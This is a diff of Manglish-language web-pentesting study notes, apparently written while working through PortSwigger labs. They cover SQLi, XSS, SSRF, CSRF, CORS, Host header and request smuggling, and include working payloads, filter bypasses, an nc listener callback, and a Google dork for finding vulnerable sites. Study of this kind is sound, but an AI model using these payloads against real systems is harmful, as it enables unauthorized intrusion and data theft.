@@ -2,14 +2,27 @@
 ### SQL I
 1) namal session id il ninum athava {"username":josu"} ennath kandu pidichu enn vecho apol josu enath mati admin enn aki nokam.but avide vech nirtharuth athilum sql i patuon nokanam ie, {"username":"admin';sleep(10);"}
 2) username=josu%password=admin' OR 1=1--    oru space um last itto (url encode it)
-3) ?category=admin' OR 1=1-- (url encode chyumbol = sign encode chythum pine chyatheyum test chyth nokanam ok athayath 1=1 ile = ok)
-4) epozhum sql i test chyan sleep(10) nokam eth parameter ilum test chyam ie
+3) username=josu'+and+sleep(9)--+&password=foo itt test chythnok.ithakunilengil josu'+or+1=1--+&passwd=foo itt test chythnok
+4) ?category=admin' OR 1=1-- (url encode chyumbol = sign encode chythum pine chyatheyum test chyth nokanam ok athayath 1=1 ile = ok)
+5) epozhum sql i test chyan sleep(10) nokam eth parameter ilum test chyam ie
                                  username:a'; SLEEP pg_sleep(10);--
                                  password:foo
 5) satharana nammal parameter value il aan injection chyuka but nauk parameter name il thane inject chyan patumonum nokam, ie, name=josu&password=foo ennath sql chyumbol -> name[0;--] or name[0; --]=josu.... ennaki noki test chyuka
 6) oru karyam sredhikuka athayath ee name enna parameter name html il input elementile name enna attributinte value aan.allathe aa attribute alla ok.namuk direct browseril thane ee sql i test chyam.inspect element adich(login areayil) edit as html kodukuka enit athile `<input ....name="name[0; --]" size="....`
 7) ==athayath burp ile parameter names(not value) okke html il varumbol oro elementinteyum attribute value aayirikum==
 8) database il username,password mathramall pala karyangalum save chyth vechitundakum.so just login page il matharmalla.pala sthalangalilum namal sqli test chyanam.json web token chelapo server databse il aayirikum save chyth vechitundavuka.so namal kid polula parameter il sqli test chyam
+9) username= 'OR'1  password= 'OR'1  enn koduth test chyth nok
+10) username= admin' UNION SELECT "xyz" as password from admins where '1'='1    - hacker101 inte exploit aan.ith ingane thane username il kodukuka enit password=xyz enum kodukuka.karanam namal "xyz" enn kodukunund username il
+11) username inte length kandupidikan -> `username=' or LENGTH(username)=§1§#&password=helo`  enn kodukuka enit intruder il onn muthal 15 vere numbers kodukuka.enit result il nokiyal or request il mathram length vere kanum.eth number il aano length vere kanunath athrem aan username.ithupole thane passwordum kandupidkam.NOTE: ivide # ittath ith maria db aayath kondan.slash means athin shesham ullathelam comment chyapedum ok
+12) image oke upload chyumbol vere thane reethiyil aanalo request undavuka apol athile ------ in thot mukalil ulla sathanathil '--+ ittoke test chyanam
+13) ellathilum -- enna comment ayirikanamenila support chyunath.chelapo ## enna comment aayirikum support cyuka ok
+14) manual aayi sql chyumbol -> aadyam table name kandethanam.table namde kandethiyal next athil ethra columns und enn kandethanam.next oro column intem datatype ariyanam.ennal mathrame dump chyan patu.NOTE: namal eth parameter il aano test chyunath athil thane columns ithra enn undakum so athinanusarich mathrame namuk different aayitula table call chyan patu ok
+15) ==NOTE: namal type chynath display il kanichal mathrame UNION based injection nadaku enn thonunu==
+16) eth type database aanen kandupidichal athinte documentation il poyal namuk default aayitula table names um column names um kaanan patum.so ath vech namuk ethoke tables um aa tables il ethoke columns um unden manasilakam ok
+17) BLIND SQLI test chyan -> parameter il  `' and 1=1--`  enn koduth test chyuka.like `cookie: tracking_id=hlsdkfjl'+and+1=1--; session=sldkf...` 1=1 epozhum true aayath kond site normal ayit thane pravarthkum.ini namal 1=1 ennath mati 1=0-- enn kodukuka enit site error vannal blind sqli und ennartham ok.so ithupole true or false question vech namuk users table undo undengil inna columns undo enoke choich manasilakam ok
+18) Time-based sqli   ->  '+||+pg_sleep(9)--;   or '+||+sleep(9)--;   depending on the DB
+19) NoSql i ->`login=josu2&password[$ne]=joseph%40michal.1&s or $gt itt nok`
+20) `Google Dork : site:domian ext:php inurl:?id=`  Athayath .php extension undayirkanam.athpole url il id enna parameter aayrikanam undayirikendath.angane namuk enthengilum url kitum.so athvech sql,xss oke nokam ok
 ### Authentication:
 1) login il username no valid enn kandal namuk username aadyam enumerate chyam karnam username valid aayite password check chyoo
 2) chelapo username password invalid ennayirikum kanuka.apol username enumerate chyan intruder il add kodukuk[[XSS]]a password parameter il ethenlum kodukuka.ennit options tab il grep-extract il poi add click chyth aa statemetn select chyth ok koduth attack chyuka
@@ -33,6 +46,12 @@
 20) request il is-admin:true enna puthiya oru header use chyth test chyth nokuka apol chelapo admin aayi mariyekam
 21) athupole x-forwarder-for:127.0.0.1 oke athinte koode koduth nokuka
 22) nammude sessionid= cookie il aayirikum namude power enthanen set chyunath.athyath namal admin aano atho normal user anno ennath.sessionid= value eduthit decode chyth nokuka athava base64 encoded aanengil easy aayi.but first url decode chyandivarum enit aayirikam base64 decode chyendath.think and do
+23) namal login page il aadyam username ilum passwordilum enthengilum oke iit send adichondirikuka enit korach attempt kahziyumbol block aakum enit ee request repeater il viduka enit namal x-forwarded-for: 3 polula header use chyth send adikuka.ip vechan namale block chyunathengil 403 forbidden varila
+24) ini login formil username correct koduth password enthengilum koduth kore pravisham send chyth namal epol aan bl0ck/lockout aakunathen nokuka
+25) repeater il valid aaya passwd adikumbol kituna same response time aano invalid aaya passwd adikumbozhum kitunath enn nokuka.ithine pati lab und
+26) otp,password oke kurach pravisham adichit namal pinem home/login page ilek redirect oke aakunundnegil lab-9 nokiko(macros)
+27) 
+
 
 
 ### Directory Traversal:
@@ -156,6 +175,7 @@ ith itt test chyth nokanam
 25) blind ssrf kandu pidikan bhayankara paad aan.but kandethiyal nalla pole enumerate chyanam.ie athinte ullile networking pati arinjirikanam ie ip range.pine guessing oke chyendivarum-lab7
 26) NOTE: nammal burp collaborator vech nslookup,whoami angnae ulla enth command adichu even athile username vare kandethan kazhinjal athoke remote code execution thane aan ok-lab7
 27) REMEMBEE: ssrf athupolulla vulnerability test chyumbol namal ineternal services (ip range) oke scan chyunath engane enal 192.168.0.$1$:8080 or 80 .enna formatil aan.karanam ip routers il internal services in kituna default ip aan 192.168.0.1/255 ath marakaruth-lab7
+28) utube ile bugbounty report explained il parayunath ssrf satharana undakunath image/avatar angane ulla namal thane aayi upload chyuna sthalangalil aanenan.athum ee ssrf oke blind aayirikumenan parayunath.athukond thane attacker in onum kanan patila response.pine ullath satharana pole server thane url vazhi oron fetch chyunath namal exploit chyunath
 
 ### XSS :
 1) You can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript
@@ -202,6 +222,25 @@ ith itt test chyth nokanam
 40) ivide product inte location check chyuna sthalath moon option und london,paris.newyork ivide sredhikanam.athayath oro country click chyumbozhum js action nadakunund.so inspect element adich nokumbol aa moon county ide mukalil aayi name=storeid enn und so javsript ee storeid eduthitan oro karyangal chyunath. so njan paranjath ingane oro action namal browser il chyumbol athinanusarich js work aakunund.so js work engane chyunu ie,id=,name= ingane ullathoke check chyanam - lab19
 41) namal enthengilum karyam browser il nokeet athayath search all ithupole check stock pole oke chyumbol namuk apol thane result kanikuanthoke DOM xss undon check chyanam
 42) epozhum ithupolul actions browser il nadakumbol athinte js code nokunath nallathayirikum. ivide search il search chythit aa result kitiya page ile js code nokiyapozhan manasilayath search chytha item .innerHTML vazhi sanitise chununden 
+43) html injection vech ssrf kandupidikan patuon nokanam.ie, `<img src="http://kali-ip:port">`  koduth save chyuka enit kalil poi -->nc -nvlp port koduth enter adikuka ok
+44) <marquee>joseph michal</marquee>
+45) `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+46) "onmouseover="alert(1)
+47)  '-alert(document.domain)-'
+48) ';alert(document.domain)//
+49) `\'-alert(1)//`
+50) http://foo?&apos;-alert(1)-&apos;
+51) ${alert(1)}
+52) # "><script>alert(3)</script>
+53) ....edback?returnPath=javascript:alert(2)  (xss with open redirection)
+54) <iframe sandbox="allow-forms" src="https://google.com"></iframe>
+55) a fn to trigger xss :
+!function(){  
+‘use strict’;  
+alert(onerror)//is null since the scope is still window  
+}();
+56) application angle bracket filter chyunaenil ex: > ith filter chyunangil inagne chythnok -> `<<sdf>script>alert(9)<<sf>/script>`  output ->`<script>alert(9)</script>`. in mate angle bracket aanengil reverse chythamathi ok
+57) iframe vech xss trigger chyan -> `<img src=1 oNeRrOr=alert`1`>`
 
 ==============================================================
 
@@ -217,8 +256,9 @@ ith itt test chyth nokanam
 9) we should use a cryptographic strength pseudo-random number generator (PRNG), seeded with the timestamp when csrf token is created plus a static secret.
 10) csrf token server ilek pokunath oru request parameter aayitan.athayath form okr submit chyumbol /POST request il etavum thaazhe aayi kanam
 11) CSRF tokens should not be transmitted within cookies.
-12) server side il users inte session data oke store chyth vechirikunund avide aan ee generate chyapeta csrf inte copy ullath.so next time user oru request chyumbol athin validation require aanengil server ee session data check chyum ee csrf matching aano enn 
-13) csrf token koodathe chela websites samesite cookie enna attribute um upayogikarund.ee sathanam session cookie ide koode aayitan kanuka
+12) csrf um session cookie yum thamil epozhum linked aayirikanam.so ath check chyan namude csrf edth namude randamathe accountile csrf il replace chyth check chyuka.status200,302 ie, ok aakuvanengil csrf um session thamil link alla means ath csrf prone aan
+13) server side il users inte session data oke store chyth vechirikunund avide aan ee generate chyapeta csrf inte copy ullath.so next time user oru request chyumbol athin validation require aanengil server ee session data check chyum ee csrf matching aano enn 
+14) csrf token koodathe chela websites samesite cookie enna attribute um upayogikarund.ee sathanam session cookie ide koode aayitan kanuka
            Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;
 14) ee sathana itt kazhinjal browsers default aayi automatically cookes request il add chyuna reethi maarun kaaranam ith vech kazhinjal pine aa particular site il ninum varuna request il mathrame cookies add chyu ilengil add chyila
 15) athukond thane oru attacker enn csrf malicious code italum nadakila.strick ittalum kozhapam und athayath oru logged in user matoru thirdparty link ilek poyal avidem user loggin chyenda avastha varum.so ith users athra rasamullathal
@@ -259,7 +299,7 @@ ith itt test chyth nokanam
 9) request il origin: header test chyumbol veruthe url kodukathe aadyam server accept chyuna origin enthanen nokuka enit aa same origin subdomain add chytho allengil athinte koode vere url oke koduth server accept chyunundon nokanam
 10) origin: headeril url koduthint accept chyunilengil :null ennu value koduth test chyuka.apol chelapo namuk Access-Control-Allow-Origin header response il tharumayirikum
 11) responseil verum Access-Control-Allow-Origin:null enna mathram aanengil namuk aa app inte public resources/data mathrame kitu.pakram Access-Control-Allow-Credentials:true ennu undengil namuk private resourses um edukan patum
-12) null vechula exploit aanengil athoru sandboc iframe element inte ullil aayi venam script chyan
+12) null vechula exploit aanengil athoru sandbox iframe element inte ullil aayi venam script chyan
 13) cors miscofiguration il originil varuna url il xss chyan patumengil athil ninum namuk important credentials xss vazhi edukan patum.athayath request i:
       origin: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`   enn koduth test chyth nokam
 14) chela application cors inayi origins whitelist chyumbol http:// ulla urls um add chythitundayekam.apol oru attacker middle il ninn user traffic intercept chyth cors configuration exploit chyam.apol attackerin origin: `http://trusted-subdomain.vulnerable-website.com` enn koduth chyam.ingane chyumbol attacker in https:// aayitulla website use chyth victim ine nallapole patiikam ith real website thane aan enn viswasipikan
@@ -288,30 +328,13 @@ ith itt test chyth nokanam
 10) sredhikuka namal post enn request mati get aakumbol athile change email/ enna path remove chyanam.enit ?email=hacker@gmail.com ennadikiumbol email change aakila pakaram aa email parameter il value aayi maarum.aa input inte ullil ee hacker@gmail.com enn kidakum burp il render adich nokiyal kanan patum
 11) Clickjacking attacks are possible whenever websites can be framed
 12) clickjacking prevent chyan vendi frame busting enna technique use chyum browser or platforms.An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute.ithin value allow-forms enn koduthal clickjacking chyan patiyekum. athayth `<iframe sandbox="allow-forms" src=...>` enn koduth test chyam-lab3
-13) ==puthiya oru logic kity->athayath input oke ulla pageil namuk ithupole oru get request undaki athil thane path parameter aayi ee input ile name koduthal mathi.enit ee link oru phising pole chythnokan sremikanam ok.namauk ariyam /POST request ukalil kanuna parameter name(not vlaues) ennath html  ukalude attribute(<`input name="josu"` -> josu ennathan udheshichath) value aan.so namuk burp il ninum parameter names kitum==
-
-==============================================================
-
-### Clickjacking :
-1) Clickjacking attacks use CSS to create and manipulate layers
-2) iframe ennal oru html element aan.oru website inte ullil thanne mattoru website load chyikan use chyunathan ith. eg: `<iframe src="target website url></iframe>"` ee code oru pageil koduthal aa pageil ee iframe varum.ithin height width oke koduthal mathi(use css)
-3) athayath real aaya oru wensite iframe il kodukunu enit athinte transperency kurakunu enit athinte molil namal vere enthengilum "click me" enno mato koduth chyunu.ee click me ennath oru `<div` element il aakunu enit ee divum namal css vech correct venda sthalath aakam
-4) div il namal kodutah word correct backil ulla button umayi align chyuka.so aa word il hover chyumbol mouse pointer maari hand juster aayi marum maaranam enale aavu
-5) namal attack chyuna site iframe support chyunundon nokanam illengil clickjacking aakila
-6) burp il menu bar il poyal "burp clickband" enn option und ath vech namuk csrf poc undakunath pole automatic aayi chyam
-7) cheala formil okke automatic aayi input fill ayirikum.eg:password matuna samayath email already fill ayirikum so ath nokuka
-8) chela form il namuk thane input kodukam.athayath url il ?email=evilmail@gmail.com enn kodukam
-9) burp il poi nokumbol email change chyuna request /POST aayirikum so request method change chyth GET method aakuka enit aa url path iframe tagil src il aaki test chythnokuka apol reqeust pokumgol namal path il email enn parameter koduthathkond automatic aayi aa input fill aayikolum.ingane test chyumbol burp il aadyam send adich test chyth nokuka 200ok kanikunundon
-10) sredhikuka namal post enn request mati get aakumbol athile change email/ enna path remove chyanam.enit ?email=hacker@gmail.com ennadikiumbol email change aakila pakaram aa email parameter il value aayi maarum.aa input inte ullil ee hacker@gmail.com enn kidakum burp il render adich nokiyal kanan patum
-11) Clickjacking attacks are possible whenever websites can be framed
-12) clickjacking prevent chyan vendi frame busting enna technique use chyum browser or platforms.An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute.ithin value allow-forms enn koduthal clickjacking chyan patiyekum. athayth `<iframe sandbox="allow-forms" src=...>` enn koduth test chyam-lab3
 13) ==puthiya oru logic kity->athayath input oke ulla pageil namuk ithupole oru get request undaki athil thane path parameter aayi ee input ile name koduthal mathi.enit ee link oru phising pole chythnokan sremikanam ok.namauk ariyam /POST request ukalil kanuna parameter name(not vlaues) ennath html  ukalude attribute(<`input name="josu"` -> josu ennathan udheshichath) value aan.so namuk burp il ninum parameter names kitum
 14) iframe use chyumbol src= aavunilengil ingaen chyth noku : `<iframe srcdoc="<script src=/theme?cb=alert ></script>">` randamathe src yil noki path kodukuka(ith work aakuvon areela ennalum nokiko).ingane CSP bypass chyan patumon nokuka.satharan src framing allow chyarila but namal ivide src load chyukayalla chyunath vere entho document load mato entho chyukayan
 15) 
 ==============================================================
 
 ### DOM-based vulnerabilities :
-1) Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.
+1) Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.athayath namal kodukuka input allengil namuk control chyan patuna parameters,messages oke server nere oru js function ilo allaenigl oru DOM objectilo kond idum.angane namal contorol chyunath dom il idumbol avide ath save aayi kidakum.angane save aakumbol naaml athil xss oke chythal stored xss pole aakum
 2) The most common source is the URL. karanam url il namuk enth input koduth controll chyan patum.An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL
 3) If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks
 4) addEventListener varuna messaginte origin verify chyunilengil ath oru vulnerability aan.namuk oru fake site iframe vazhi use chyth `contentWindow.postMessage('print()','*')` ee reethiyil postMessage method koduth namuk venda karyam execute chyam
@@ -333,15 +356,18 @@ ith itt test chyth nokanam
 20) html injection chyan patuna sthalath clobbering chyan patumon nokuka
 21) ==dom clobbering test chyan evidengilum html code chyan patumon nokuka.patumengil `<div id=hello>test html </div` so ingane chythal error onum varila karanam html already accept chyunathkondanalo ingane chyunath.pakshe ingane chyumbol ee id enna attribute ile value dom il save aakunund.ath manasilakan ->inspect->console il poi window.hello enn adichal kanam ee code kidakunath.so window.hello namude ee div ine point chyunu==
 22) ivde live overflow utube videoyil window.load_debug enna oru code und.athinte koode entho function um und so site load chythathin shesham entho particular action nadann kazhiyumbol aan ee funtion execute chyuka.but ivide site il evidengilum namuk html inject chyan patunathkond namuk `<div id=load_debug>test div</div>` enn koduth ee div dom il aakam.ini console il poi nokiyal kanam load_debug is not a function enn.athinartham namude load_debug div dom il aayi so ini js load_debug enna vere enthengilum sathanam kandal error kanikum already athupole oru sathanam div aayikidakunund
+23) view-source adichit html,js il oke location.something il oke open redirection undon check chyanam.like aa name attribute url il parameter aayi koduth https://google.com enoke koduth nokuka
+24) 
 
 ==============================================================
 
 ###  WebSockets :
-1) http/https use unidirectional communication.athayath sender oru request trigger chythale response kitu
-2) Websockets are bidirectional.athayath sender can send the data and the receiver can also send the data(sender enthengilum request ayachale server enthengilum ayaku enna paripadi ivide illa) eg: chat application.so browser il namal chat window open chythu enit namude friend in oru hai ayakunu.apol ee mesg server ilek pokunu enit server aan friend in ee hait enna msg ayakunath.so sender um data send chyunu server um data send chyunu
-3) websockets il origin vulnerability undakum.so correct aayi origin validate chyanam ilengil cors polula exploit undakam
-4) session handling in websocket handshake verum http cookie yil mathram rely chyunath nallathall.csrf token koodi use chyanam.csrf token illengil ath nallathalla.athayath cookie vech mathram session handle chyan padila
-5) athikam ella logicum main page il und nokiko
+1) oru websocket ilek maranengil aadyam http handshake nadakanam.so first http vazhi request nadakunu enit aa request inte response aayi upgradation nadakunu enitaan websocket communication nadakunath ok.so first nadakuna http handshake reqeust study chyuka like csrf undo,origin header correct aayitano implement chythath oke ok
+2) http/https use unidirectional communication.athayath sender oru request trigger chythale response kitu
+3) Websockets are bidirectional.athayath sender can send the data and the receiver can also send the data(sender enthengilum request ayachale server enthengilum ayaku enna paripadi ivide illa) eg: chat application.so browser il namal chat window open chythu enit namude friend in oru hai ayakunu.apol ee mesg server ilek pokunu enit server aan friend in ee hait enna msg ayakunath.so sender um data send chyunu server um data send chyunu
+4) websockets il origin vulnerability undakum.so correct aayi origin validate chyanam ilengil cors polula exploit undakam
+5) session handling in websocket handshake verum http cookie yil mathram rely chyunath nallathall.csrf token koodi use chyanam.csrf token illengil ath nallathalla.athayath cookie vech mathram session handle chyan padila
+6) athikam ella logicum main page il und nokiko
 
 ==============================================================
 
@@ -417,15 +443,16 @@ ith itt test chyth nokanam
 ==============================================================
 
 ### HTTP Host header attacks :
-1) Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.
-2)   -   Web cache poisoning
+1) application il host header injection test chyumbol response il server: cloudflare enoke kandal aa domain test chyenda avisham ila.karanam CDN use chyunengil host header injection nadakila
+2) Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.
+3)   -   Web cache poisoning
 -   Business logic flaws in specific functionality
 -   Routing-based SSRF
 -   Classic server-side vulnerabilities, such as SQL injection
     ithupolulla vulnerabilites host header attack vazhi chyan sathikum
 3) host header il enthengilum extra sathanam itt test chyth nokanam.apol athikam error veram. error veratha situation undakum athayath extra sathanam ittitum oru kozhapam illathe site load aakunundengil namal ath further test chyanam.karanam ennale namuk athil nadakuna behavior manasilakan patu
 4) arbitrary sathanam host il itt send chyumbol "`Invalid Host header`"  ennayirikum response varuka.ella response um ingane aayirikanamenila.so varuna response in anusarich forward chyanam
-5) host header il port chech chyunundon nokanam.check chyunilengil avide namuk payload chyan patumon nokanam
+5) host header il port check chyunundon nokanam.check chyunilengil avide namuk payload chyan patumon nokanam
 
                         GET /example HTTP/1.1 
                         Host: vulnerable-website.com:bad-stuff-here
@@ -436,27 +463,30 @@ ith itt test chyth nokanam
                          Host: bad-stuff-here      (ingane space itt test chyuka)
                     Host: vulnerable-website.com
 8) `#3 Inject host override headers`   ithil ulla points oke poi vayik important aan
-9) In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.
-10) password reset chyunath namuk namude emaililek avar ayach thannal chelapo link aayitayirikum allengi just oru button pole aayirikum.link aanengil aa link eduth matoru tab open aaki load chyth repeater il oke itt test chyam.button aanengi right click chyth copy link location eduth nerthepole thane test chyam
-11) ini ee vana link click chyth aadyam normal aayi password reset chyuka apol request il oke enthan nadakunath enn nokuka.enth karyam chyumbozhum aadyam genuine aayi chyuka enit venam malicious aayi test chyan
-12) Every HTTP header is a potential vector for exploiting classic server-side vulnerabilities, and the Host header is no exception. For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.
-13) host: localhost allengil 127.0.0.1  oke itt chyam.ivide lab4 il admin panel local users in acces chyan patum.so host: localhost enn kodukumbol aakunund
-14) Companies sometimes make the mistake of hosting publicly accessible websites and private, internal sites on the same server
-15) internal networkil nadakuna karyangal oke ip adress ayirikum athinte oke url/path.so athkondan namal lab-5 il ip adress vech bruteforce chyth nokiyath.apol aan manasilakunath oru partical ip vech kerumbol mathrame namuk /admin panel ilek keran patumennath
-16) host: collaborator url  koduthit athilek request pokunundengil namal aa request intruderil itt collbaorator url maati ip adress koduth nokuka eg: `192.168.0.0/24`  enit ethengilum ip run chyunundon nokuka
-17) intruderil host header bruteforce chyumbol mukalil ullath untick chyanam ie,`update host header to match target`   ennale burp in manasilaku ee host header namal maati test chyukayanen
-18) requst il ulla host headeril enthengilum add chythit send chyuka.athikam error varum.so host header original value kodukuka enit GET / request il ee /  kalanjit aa website inte original url kodukuka(eth page inte request aano aa page il ninum url eduth paster chyuka) enit respone enthanen nokuka - lab6
-19)    ==our request -> firwall kadann pokunu -> avide reverseproxy/loadbalancer undakum.ith namude request application ilekano atho internal services ilekano pokendath enn noki angot request ayakum -> so finaly request backend application ilek varum enit ivide nin response thirich ithe vazhiyilude client il varum ok==
-20) oru request kitiyal host: internal-ip:80 koduth send adich nokuka ok. 80 mathramalla 8082 angane pala portum itt koduth nokam.oru cache buster aadyam kodukuka enit internal ip koduth portum koduth test chyth nokuka. GET chythit aavunilengil HELP method use chyth nokam ok( HELP /?cb=123 host: 74.6.49.129:8082)
-21) GET http://74.6.49.129:8082/ HTTP/1.1   ennum koduth test chyuk
-22) host: ../?x=google.com   enn koduth send chyth nokuka.(open redirection testing)
-23) GET burpcollaboratorurl koduth nokuka(withuout any slash) enit host original thane koduthnokuka.poll now adikumbol chealapo request angot poyekum
-24) referer: http://collaboratorr url koduth nokam
-25) x-forwarded-for: collaborator url koduth nokam
-26) true-client-ip: collaborator url koduth nokam
-27) x-real-ip: collaborator url koduth nokam
-28) GET /?a=collaboratorurl&a=collaboratorurl koduth nokam. oru parameter koduth ping kitilengil same name il ulla oru parameter koodi koduth send chyth nokam.ee reethiyi chyth nokumbol ecapsula enna sathanam fetch chyum.encapsula enthanen correct areela
-29) reverse proxy il ulla oru feature engandan load balancing.eg: kore clients amazon.com request chyumbol kore request serverilek varum.apol aa load balance chyunathan load balancer aan
+9) namuk host header change chyan patunengil actions nadathuna request il chyth nokanam.like email change chyuna request il host mati exploit server kodukuka enit namuk change chyan aayi veruna link il chelapo namude exploit server ayirikum host aayi kidakuka apol namuk matoru user in email change chyuna request ayach kodukam. lab2
+10) In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.
+11) password reset chyunath namuk namude emaililek avar ayach thannal chelapo link aayitayirikum allengi just oru button pole aayirikum.link aanengil aa link eduth matoru tab open aaki load chyth repeater il oke itt test chyam.button aanengi right click chyth copy link location eduth nerthepole thane test chyam
+12) ini ee vana link click chyth aadyam normal aayi password reset chyuka apol request il oke enthan nadakunath enn nokuka.enth karyam chyumbozhum aadyam genuine aayi chyuka enit venam malicious aayi test chyan
+13) Every HTTP header is a potential vector for exploiting classic server-side vulnerabilities, and the Host header is no exception. For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.
+14) host: localhost allengil 127.0.0.1  oke itt chyam.ivide lab4 il admin panel local users in acces chyan patum.so host: localhost enn kodukumbol aakunund
+15) Companies sometimes make the mistake of hosting publicly accessible websites and private, internal sites on the same server
+16) internal networkil nadakuna karyangal oke ip adress ayirikum athinte oke url/path.so athkondan namal lab-5 il ip adress vech bruteforce chyth nokiyath.apol aan manasilakunath oru partical ip vech kerumbol mathrame namuk /admin panel ilek keran patumennath
+17) host: collaborator url  koduthit athilek request pokunundengil namal aa request intruderil itt collbaorator url maati ip adress koduth nokuka eg: `192.168.0.0/24`  enit ethengilum ip run chyunundon nokuka
+18) REMEMBER : intruderil host header bruteforce chyumbol mukalil ullath untick chyanam ie,`update host header to match target`   ennale burp in manasilaku ee host header namal maati test chyukayanen
+19) requst il ulla host headeril enthengilum add chythit send chyuka.athikam error varum.so host header original value kodukuka enit GET / request il ee /  kalanjit aa website inte original url kodukuka(eth page inte request aano aa page il ninum url eduth paster chyuka) enit respone enthanen nokuka - lab6
+20)    ==our request -> firwall kadann pokunu -> avide reverseproxy/loadbalancer undakum.ith namude request application ilekano atho internal services ilekano pokendath enn noki angot request ayakum -> so finaly request backend application ilek varum enit ivide nin response thirich ithe vazhiyilude client il varum ok==
+21) oru request kitiyal host: internal-ip:80 koduth send adich nokuka ok. 80 mathramalla 8082 angane pala portum itt koduth nokam.oru cache buster aadyam kodukuka enit internal ip koduth portum koduth test chyth nokuka. GET chythit aavunilengil HELP method use chyth nokam ok( HELP /?cb=123 host: 74.6.49.129:8082)
+22) GET http://74.6.49.129:8082/ HTTP/1.1   ennum koduth test chyuk
+23) host: ../?x=google.com   enn koduth send chyth nokuka.(open redirection testing)
+24) GET burpcollaboratorurl koduth nokuka(withuout any slash) enit host original thane koduthnokuka.poll now adikumbol chealapo request angot poyekum
+25) referer: http://collaboratorr url koduth nokam
+26) x-forwarded-for: collaborator url koduth nokam
+27) true-client-ip: collaborator url koduth nokam
+28) x-real-ip: collaborator url koduth nokam
+29) GET /?a=collaboratorurl&a=collaboratorurl koduth nokam. oru parameter koduth ping kitilengil same name il ulla oru parameter koodi koduth send chyth nokam.ee reethiyi chyth nokumbol ecapsula enna sathanam fetch chyum.encapsula enthanen correct areela
+30) reverse proxy il ulla oru feature engandan load balancing.eg: kore clients amazon.com request chyumbol kore request serverilek varum.apol aa load balance chyunathan load balancer aan
+31) oru website inte ip kandupidkan oru trick und.ie, host header il burp collaborator client kodukuka enit poll now adikuka apol namuk avide aa website inte ip kitiyekam
+32) host header il ip vechoke test chyumbol GET /admin/.. ennath mati just GET /  enn mathram aakiyamathi enn thonunu.enit update host header to match target untick chyuka enit venam attack chyan.result kiti kazhinj namuk pinem GET /admin enoke akkam
 
 ==============================================================
 
@@ -486,16 +516,16 @@ ennakum.so ee randamathe line(foo: xGET..) server just ingonre chyum apol onnama
 8) content-length um transfer-encoding um orumich request il vannal content-lenth automatic aayi ignore chyum.athan korachudi safe
 9) oru GET / request edukuka  enit athile aadyathe rand line ozhichu baaki ellam remove chyuka ie, path and host:  header ozhich. enit GET ennath POST aakuka.karanam POST Il mathrame body undaku.ini host: header in thazhe aayi ingane kodukuka :
 
-                      POST / HTTP/1.1 
-                      Host: your-lab-id.web-security-academy.net 
-                      Connection: keep-alive 
-                      Content-Type: application/x-www-form-urlencoded 
-                      Content-Length: 6 
-                      Transfer-Encoding: chunked 
+POST / HTTP/1.1 
+Host: your-lab-id.web-security-academy.net 
+Connection: keep-alive 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 6 
+Transfer-Encoding: chunked 
                       
-                      0 
+0 
                       
-                      G
+G
 6) ivide 0 kk sesham thazhe veruthe line ittathala.ivide request il chunked encoding ullathkond body il ethra bytes unden kanikanam.so ivide zero bytes aan.so zero aayalum 5 aayalum ath next line il kanikanam.so ivide zero aayath kond next line il onum undakan padila.enthengilum undayal zero bytes alla ennartham.pine content-length pole `\r\n`  onum bytes kanakaiila.so charecters in mathrame bytes kanakaku.content-lenth aayirunengil 0`\r\n`  okke aayi namal kanendi vannene apol bytes inte ennam kodum.but chunked il angane onum ila
 7) content-length inte bytes correct manasilakanamengil `\r` and `\n` manasilkanam. `\r` ennal carriage return aan.athayath `\r` iital namude type chyuna cursur beginingilek pokum eg: 
   `print("Hello world")  print("hello \rworld")`  ivide namal result nokiyal  :
@@ -566,8 +596,10 @@ ee request um athinte  response um nok.ivide `X: XGET`  enn kanuna line nok.enik
 33) rand request group aaki send chyuna samayath request inte (mainly first request inte) connection: close aanengil ath maati keep-alive koduth nokuka.athikavum oru request in athinte response koduthal server aa connection close aakum apol namuk next request athinte koode kodukan patanamenila-lab15
 34) request smuggling ine desync ennum parayumen thonunu
 35) Web servers can sometimes be encouraged to respond to `POST` requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, this results in a `client-side desync` vulnerability.
-36) namal request smuggling chyumbol content length correct kitathond timeout error varum. angane varumbol connection close aakum server.so chela samayam backend server timeout error vanalum back-end connection close chyila.so angane oke ulla samayam namuk pause based request smuggling oke try chyam
+36) namal request smuggling chyumbol content length correct kitathond timeout error varum. angane varumbol connection close aakum server.==so chela samayam backend server timeout error vanalum back-end connection close chyila.so angane oke ulla samayam namuk pause based request smuggling oke try chyam==
 37) trubo intruder tool Some server-side pause-based desync vulnerabilities kandupidikan best aan.ithine pati njan main page il type chythitund last aan ee topic varunath
+38) Github il smuggler enna tool und ->`python3 smuggler.py -u http://google.com/endpoint` koduth search chyth nokuka
+39) 
 
 ==============================================================
 
@@ -575,13 +607,114 @@ ee request um athinte  response um nok.ivide `X: XGET`  enn kanuna line nok.enik
 1) oAuth is build for authorisation
